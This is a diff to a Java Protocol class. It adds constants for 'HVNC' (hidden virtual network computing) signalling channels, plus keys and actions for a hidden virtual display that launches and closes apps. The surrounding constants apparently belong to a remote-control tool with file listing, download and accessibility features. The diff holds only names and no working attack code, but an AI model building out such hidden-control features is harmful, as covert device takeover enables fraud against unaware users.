@@ -38,6 +38,13 @@ public final class Protocol {
     public static final String WEBRTC_ANSWER = "0xWA";
     public static final String WEBRTC_ICE    = "0xWC";
 
+    // HVNC (Hidden Virtual Network Computing) channels
+    public static final String HVNC           = "0xHV";
+    public static final String HVNC_CTRL      = "0xHC";
+    public static final String HVNC_OFFER     = "0xHO";
+    public static final String HVNC_ANSWER    = "0xHA";
+    public static final String HVNC_ICE       = "0xHI";
+
     // Actions
     public static final String ACT_LS            = "ls";
     public static final String ACT_DL            = "dl";
@@ -287,6 +294,16 @@ public final class Protocol {
     public static final String KEY_ROTATION   = "rotation";
     public static final String KEY_ACCESSIBLE = "accessible";
     public static final String KEY_STREAMING  = "streaming";
+
+    // JSON keys — HVNC (hidden virtual display)
+    public static final String KEY_DISPLAY_ID  = "displayId";
+    public static final String KEY_VIRTUAL_W   = "virtualWidth";
+    public static final String KEY_VIRTUAL_H   = "virtualHeight";
+
+    // HVNC actions
+    public static final String ACT_LAUNCH_APP  = "launchApp";
+    public static final String ACT_CLOSE_APP   = "closeApp";
+    public static final String ACT_RESIZE      = "resize";
 
     // Actions transported over the WebRTC control data channel (and the
     // authenticated SCREEN_CTRL fallback channel).
